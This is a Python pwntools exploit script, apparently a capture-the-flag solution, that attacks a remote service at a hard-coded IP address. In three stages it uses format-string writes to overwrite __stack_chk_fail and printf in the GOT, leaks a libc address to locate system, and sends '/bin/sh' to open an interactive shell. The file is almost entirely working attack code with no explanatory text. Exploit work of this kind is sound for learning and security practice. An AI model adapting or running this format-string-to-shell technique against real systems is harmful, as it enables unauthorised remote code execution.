#!/usr/bin/env python3

from pwn import *
import clipboard

exe = ELF("./f_one_patched")
libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")
ld = ELF("./ld-2.27.so")
context.binary = exe
# context.log_level = 'debug'

# p = process("./f_one_patched")
p = connect('142.93.228.122', 1111)

#####################################################
### Stage 1: Overwrite stack_check_fail to vuln() ###
### and leak some address						  ###
#####################################################
libc_start_main_ret_offset = 0x021b97
system_offset = 0x04f4e0
stack_chk_fail_offset = 56 		# if 56, '\n' will go to stack_chk_fail
stack_chk_fail_got = exe.got['__stack_chk_fail']	#0x600ba0
# exe_vuln_func = 0x4006b7
# stack_chk_fail_fmtstr_offset = 13
# libc_start_main_ret_fmtstr_offset = 17

payload1 = b'%c'*10
payload1 += b'%1709c%hn'	# Overwrite stack_chk_fail
payload1 += b'%17$p'		# leak libc_start_main_ret address
payload1 = payload1.ljust(stack_chk_fail_offset-8, b'P')
payload1 += p64(stack_chk_fail_got)

p.recvuntil(b'thing:')
p.sendline(payload1)
p.recvline()
libc_start_main_ret_addr = int(p.recvline().split(b'0x')[1][:12], 16)
libc_base = libc_start_main_ret_addr - libc_start_main_ret_offset
system_addr = libc_base + system_offset
print('[+] Leak libc_start_main_ret address:' + hex(libc_start_main_ret_addr))
print('[*] Libc base: ' + hex(libc_base))
print('[*] System address: ' + hex(system_addr))

###############################################
### Stage 2: Overwrite printf@got to system ###
###############################################
printf_got = 0x600ba8           	# 0x7ffff7 a48f 00

payload2 = b'%c'*9
payload2 += b'%215c%hhn'
payload2 += '%{}c%hn'.format(int(hex(system_addr)[8:-2], 16) - 0xe0).encode()
payload2 = payload2.ljust(stack_chk_fail_offset-8*2, b'P')
payload2 += p64(0x600ba8)
payload2 += b'AAAABBBB'
payload2 += p64(0x600ba8 + 1)

p.sendline(payload2)

############################################
### Stage 3: Insert string '/bin/sh\x00' ###
############################################
payload3 = b'/bin/sh\x00'
payload3 = payload3.ljust(stack_chk_fail_offset, b'P')

p.recvuntil(b'thing: ')
p.sendline(payload3)

p.interactive()

